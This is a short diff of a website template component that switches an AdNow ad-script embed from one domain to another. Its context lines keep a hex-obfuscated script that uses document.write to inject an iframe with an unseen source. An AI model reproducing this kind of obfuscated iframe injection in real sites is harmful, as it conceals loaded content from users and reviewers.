@@ -30,13 +30,14 @@ const TemplateWrapper = ({ children }) => {
        	<td> <script type="text/javascript">
 		var _0x28f9 = ["\x3C\x68\x32\x20\x61\x6C\x69\x67\x6E\x3D\x22\x63\x65\x6E\x74\x65\x72\x22\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22","\x2F\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x68\x31\x3E","\x77\x72\x69\x74\x65"];document[_0x28f9[2]](_0x28f9[0]+ src1+ _0x28f9[1])
 		</script>
-		<script type="text/javascript">(sc_adv_out = window.sc_adv_out || []).push
-        ({
-    		id: 852559,
-    		domain: "n.ads5-adnow.com",
-		});
-		</script>
-		<script type="text/javascript" src="//st-n.ads5-adnow.com/js/a.js" async></script>
+		<script type="text/javascript">
+            (sc_adv_out = window.sc_adv_out || []).push({
+                id : "852559",
+                domain : "n.ads1-adnow.com",
+                no_div: false
+            });
+        </script>
+        <script async type="text/javascript" src="//st-n.ads1-adnow.com/js/a.js"></script>
 		</td>
 		</tr>
 
